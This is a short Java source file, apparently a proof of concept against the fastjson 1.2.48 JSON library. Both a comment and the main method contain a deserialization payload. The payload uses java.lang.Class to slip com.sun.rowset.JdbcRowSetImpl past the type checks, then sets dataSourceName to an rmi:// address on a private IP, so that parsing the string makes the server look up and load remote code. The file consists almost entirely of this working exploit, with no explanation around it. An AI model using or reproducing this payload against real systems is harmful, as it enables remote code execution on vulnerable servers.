package fastjson;

import com.alibaba.fastjson.JSON;

/*
{
    "a":{
    "@type":"java.lang.Class",
            "val":"com.sun.rowset.JdbcRowSetImpl"
},
    "b":{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
            "dataSourceName":"rmi://10.41.230.66:1099/duhxn6",
            "autoCommit":true
}
}
 */
public class fastjson_1_2_48 {
    public static void main(String[] args) {
        String json = "{\n" +
                "    \"a\":{\n" +
                "    \"@type\":\"java.lang.Class\",\n" +
                "            \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "},\n" +
                "    \"b\":{\n" +
                "    \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "            \"dataSourceName\":\"rmi://192.168.26.152:1099/0gldtz\",\n" +
                "            \"autoCommit\":true\n" +
                "}\n" +
                "}";
        JSON.parseObject(json);
    }
}
